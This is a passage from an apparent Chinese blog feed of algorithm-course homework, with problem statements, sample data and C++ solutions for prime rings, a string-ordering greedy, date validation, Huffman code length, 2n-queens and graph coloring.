4</p><p>对于输入样例中的8，有以下4种合法方案（首尾相连构成一个环）</p><p>1 2 3 8 5 6 7 4</p><p>1 2 5 8 3 4 7 6</p><p>1 4 7 6 5 8 3 2</p><p>1 6 7 4 3 8 5 2</p><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,ans,last;</span><br><span class="line"><span class="keyword">bool</span> visited[<span class="number">32</span>];</span><br><span class="line"><span class="keyword">bool</span> isPrime[<span class="number">40</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pc</span><span class="params">(<span class="keyword">int</span> cur)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur == n &amp;&amp; isPrime[<span class="number">1</span>+last])</span><br><span class="line">    &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i] &amp;&amp; isPrime[last+i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> t = last;</span><br><span class="line">            last = i;</span><br><span class="line">            visited[i] = <span class="literal">true</span>;</span><br><span class="line">            pc(cur+<span class="number">1</span>);</span><br><span class="line">            visited[i] = <span class="literal">false</span>;</span><br><span class="line">            last = t;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(visited,<span class="number">0</span>,<span class="keyword">sizeof</span>(visited));</span><br><span class="line">        ans = <span class="number">0</span>;</span><br><span class="line">        last = <span class="number">1</span>;</span><br><span class="line">        pc(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-数据加密"><a href="#问题-E-数据加密" class="headerlink" title="问题 E: 数据加密"></a>问题 E: 数据加密</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>密码学是研究编制密码和破译密码的技术科学。研究密码变化的客观规律，应用于编制密码以保守通信秘密的，称为编码学；应用于破译密码以获取通信情报的，称为破译学，总称密码学。密码是通信双方按约定的法则进行信息特殊变换的一种重要保密手段。依照这些法则，变明文为密文，称为加密变换；变密文为明文，称为脱密变换。密码在早期仅对文字或数码进行加、脱密变换，随着通信技术的发展，对语音、图像、数据等都可实施加、脱密变换。<br>现在要求你用下面给定的方法对数据实现加密。给定长度为n的字符串S（1&lt;=n&lt;=2000,S中只有大写字母）作为明文，要求构造一个字符串T作为密文，起初T是一个空串，之后反复执行以下任意操作</p><p>1.从S的头部删除一个字符，加入到T的尾部<br>2.从S的尾部删除一个字符，加入到T的尾部</p><p>最后S会变成空串，T会变成一个长度为n的字符串作为密文。当然并非所有的构造方案都是符合条件的，我们要求构造出的密文T的字典序尽可能小，你能找出这个字典序最小的密文吗？</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>输入包含多组数据，每组数据占两行，第一行为一个整数n（1&lt;=n&lt;=2000）代表字符串S的长度，第二行为一个长度为n的字符串S代表明文，保证S中只有大写字母</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>对每组数据，输出一行字符串，代表构造出的字典序最小的密文T</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">6</span><br><span class="line">ACDBCB</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCBCD</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><p>字典序是指从前往后比较两个字符串大小的方法。首先比较第1个字符，如果不同则第1个字符更小的字符串更小，如果相同则继续比较第2个字符……如此继续，来比较整个字符串的大小</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">2005</span>],ans[<span class="number">2005</span>];</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;str;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>,j = n<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt;= j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; i+k &lt; j-k; k++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(str[i+k] &lt; str[j-k])</span><br><span class="line">                &#123;</span><br><span class="line">                    flag = <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(str[i+k] &gt; str[j-k]) <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(flag) </span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;str[i++];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;str[j--];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;算法作业。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://1187100546.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://1187100546.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>算法实验（四）</title>
    <link href="https://1187100546.github.io/2019/10/25/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C4/"/>
    <id>https://1187100546.github.io/2019/10/25/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C4/</id>
    <published>2019-10-25T09:15:22.000Z</published>
    <updated>2019-11-09T09:20:48.543Z</updated>
    
    <content type="html"><![CDATA[<p>算法实验四。</p><a id="more"></a><h2 id="问题-A-判断日期是否符合格式"><a href="#问题-A-判断日期是否符合格式" class="headerlink" title="问题 A: 判断日期是否符合格式"></a>问题 A: 判断日期是否符合格式</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>我们知道一年有12个月，每个月最多有31天，年有平年和闰年之分，本题目要求如果输入一个日期，程序需要判断用户输入的日期是否正确。</p><p>提示：测试输入的三个数字中，年份是正数，月份和日期有可能是负数，程序需要对这两个数为负数的情况进行判断。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例，对每组测试用例：</p><p>用户输入是三个数字，分别表示年，月和日。 例如 2007 10 21 ，表示2007年10月21日，这个输入经过判断是正确的。又例如输入 1993 11 38 ，这个输入经过判断是错误的，因为日期不能超过31天。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>程序的输出分为两种，1或者0。1表示输入正确，0表示输入错误。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2011 21 10</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> days[<span class="number">13</span>] = &#123;<span class="number">0</span>,<span class="number">31</span>,<span class="number">28</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">30</span>,<span class="number">31</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isLeap</span><span class="params">(<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(y%<span class="number">400</span> == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(y%<span class="number">4</span> == <span class="number">0</span> &amp;&amp; y%<span class="number">100</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y,m,d;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;y&gt;&gt;m&gt;&gt;d)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = isLeap(y);</span><br><span class="line">        <span class="keyword">if</span>(m &lt;= <span class="number">0</span> || m &gt; <span class="number">12</span> || d &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"0"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> dd = days[m];</span><br><span class="line">        <span class="keyword">if</span>(m == <span class="number">2</span> &amp;&amp; flag) </span><br><span class="line">            dd++;</span><br><span class="line">        <span class="keyword">if</span>(d &lt;= dd)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"1"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"0"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-哈夫曼编码"><a href="#问题-B-哈夫曼编码" class="headerlink" title="问题 B: 哈夫曼编码"></a>问题 B: 哈夫曼编码</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一只含有小写字母的字符串；输出其哈夫曼编码的长度</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>第一行一个整数T，代表样例的个数，接下来T行，每行一个字符串，0&lt;T&lt;=2000,字符串长度0&lt;L&lt;=1500.</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>对于每个字符串，输出其哈夫曼编码长度</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">hrvsh</span><br><span class="line">lcxeasexdphiopd</span><br><span class="line">mntflolfbtbpplahqolqykrqdnwdoq</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10</span><br><span class="line">51</span><br><span class="line">115</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">30</span>],ans;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span>&amp; a,<span class="keyword">int</span>&amp; b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">char</span> str[maxn];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;str;</span><br><span class="line">        <span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="keyword">sizeof</span>(num));</span><br><span class="line">        <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            num[<span class="keyword">int</span>(str[i]-<span class="string">'a'</span>)]++;</span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp1&gt; pq;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(num[i]) pq.push(num[i]);</span><br><span class="line">        ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(pq.size() &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a,b;</span><br><span class="line">            a = pq.top();</span><br><span class="line">            pq.pop();</span><br><span class="line">            b = pq.top();</span><br><span class="line">            pq.pop();</span><br><span class="line">            pq.push(a+b);</span><br><span class="line">            ans += a+b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-2n皇后问题"><a href="#问题-C-2n皇后问题" class="headerlink" title="问题 C: 2n皇后问题"></a>问题 C: 2n皇后问题</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个 <em>n\</em>n*的棋盘，棋盘中有一些位置不能放皇后。现在要向棋盘中放入 n 个黑皇后和 n个白皇后，使任意的两个黑皇后都不在同一行、同一列或同一条对角线上，任意的两个白皇后都不在同一行、同一列或同一条对角线上。问总共有多少种放法？n 小于等于 8。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p> 输入的第一行为一个整数 n，表示棋盘的大小。</p><p>​    接下来 n 行，每行 n 个 0 或 1 的整数，如果一个整数为1，表示对应的位置可以放皇后，如果一个整数为 0，表示对应的位置不可以放皇后。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>输出一个整数，表示总共有多少种放法</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> map_q[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> x1[maxn],x2[maxn],ans,n;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!map_q[xx][yy]) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xx; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(yy == x1[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(xx - i) == <span class="built_in">abs</span>(yy - x1[i])) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//斜对角</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!map_q[xx][yy]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xx; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(yy == x2[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(xx - i) == <span class="built_in">abs</span>(yy - x2[i])) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//斜对角</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">queen</span><span class="params">(<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l == n)</span><br><span class="line">    &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(check1(l,i))</span><br><span class="line">        &#123;</span><br><span class="line">            x1[l] = i;</span><br><span class="line">            map_q[l][i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(check2(l,j))</span><br><span class="line">                &#123;</span><br><span class="line">                    x2[l] = j;</span><br><span class="line">                    queen(l+<span class="number">1</span>);</span><br><span class="line">                    x2[l] = <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            map_q[l][i] = <span class="number">1</span>;</span><br><span class="line">            x1[l] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;map_q[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">    queen(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-图的m着色问题"><a href="#问题-D-图的m着色问题" class="headerlink" title="问题 D: 图的m着色问题"></a>问题 D: 图的m着色问题</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p><h3 id="输出-3"><a href="#输出-3" 